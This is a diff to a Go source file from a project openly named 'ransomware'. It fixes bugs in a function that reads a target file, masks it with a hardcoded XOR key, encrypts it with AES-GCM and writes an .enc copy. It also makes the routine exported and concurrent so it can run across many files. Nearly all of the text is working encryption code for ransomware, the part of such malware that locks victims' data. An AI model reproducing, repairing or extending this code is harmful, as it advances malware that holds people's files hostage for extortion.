@@ -1,20 +1,26 @@
-package encrypt 
+package encrypt
 
 import (
-	"ransomware/encrypt/xor"
+	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
-	"crypto/aes"
-	"io/ioutil"
+	"davidlares/ransomware/encrypt/xor"
+	"davidlares/ransomware/mapper"
 	"fmt"
+	"io"
+	"io/ioutil"
 	"os"
 )
 
 const xorKey = "mysecretkey"
 
-func encryptWithXorAndAES(id int, filename, keyFile string) error {
-	// file 
-	inline, err := os.ReadFile(filename)
+func EncryptWithXorAndAES(id int, filename, keyFile string, encryptControl chan struct{}) error {
+	// defer channel
+	defer func() { <-encryptControl }()
+	// then
+	defer mapper.Wg.Done()
+	// file
+	inFile, err := os.ReadFile(filename)
 	if err != nil {
 		return fmt.Errorf("Error reading file %w", err)
 	}
@@ -28,15 +34,15 @@ func encryptWithXorAndAES(id int, filename, keyFile string) error {
 		return fmt.Errorf("Invalid key length: %d bytes. Key must be 16, 24, or 32 bytes long", len(key))
 	}
 	// masked data (calling the file)
-	maskedData := xor.XorBytes(infile, []byte(xorKey))
+	maskedData := xor.XorBytes(inFile, []byte(xorKey))
 	// generating the block
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return fmt.Errorf("Error creating AES cipher: %w", err)
 	}
-	// GCM mode 
-	aesGCM := cipher.NewGCM(block)
-	if(err != nil) {
+	// GCM mode
+	aesGCM, err := cipher.NewGCM(block)
+	if err != nil {
 		return fmt.Errorf("Error creating GCM mode: %w", err)
 	}
 	// nonce (random and unique per file)
@@ -44,8 +50,8 @@ func encryptWithXorAndAES(id int, filename, keyFile string) error {
 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
 		return fmt.Errorf("Error generating nonce: %w", err)
 	}
-	// cipher text 
-	ciphertext := aesGCM.Seal(nonce, nonce, maskedData, nil) 
+	// cipher text
+	ciphertext := aesGCM.Seal(nonce, nonce, maskedData, nil)
 	// out file => this is the converted file
 	outFile, err := os.Create(filename + ".enc")
 	if err != nil {
@@ -53,8 +59,8 @@ func encryptWithXorAndAES(id int, filename, keyFile string) error {
 	}
 	// close the file when done
 	defer outFile.Close()
-	// write cipher text 
-	_, err := outFile.Write(nonce)
+	// write cipher text
+	_, err = outFile.Write(nonce)
 	if err != nil {
 		return fmt.Errorf("Error writing nonce to output file: %w", err)
 	}
